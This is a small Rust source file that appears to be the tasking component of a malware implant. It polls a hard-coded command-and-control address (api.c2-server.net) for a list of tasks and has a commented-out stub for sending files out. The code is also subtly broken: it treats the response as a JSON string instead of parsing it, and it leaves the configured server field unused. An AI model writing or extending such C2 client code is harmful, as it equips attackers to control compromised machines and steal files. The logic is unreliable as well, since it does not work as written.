extern crate reqwest;
extern crate serde_json;

use error_chain::error_chain;

error_chain! {
    foreign_links {
        Io(std::io::Error);
        HttpRequest(reqwest::Error);
    }
}

pub struct JsonComms {
    pub server: String,
}

impl JsonComms {
    pub fn get_tasks(&self) -> Vec<String> {
        let body = self._get_task_task().unwrap();
        let empty_result = vec![serde_json::json!([])];
        let result = body.as_array().unwrap_or(&empty_result);
        let mut task_list = Vec::<String>::new();
        for elem in result {
            let task:String = (*elem).to_string();
            task_list.push(task);
        }
        return task_list;
    }

    pub fn _get_task_task(&self) -> Result<serde_json::Value> {
        let body = serde_json::json!(reqwest::blocking::get("http://api.c2-server.net/alumina/get_tasks")?.text()?);
        Ok(body)
    }

    // pub fn send_file(&self, file_name: String) {
    // }
}
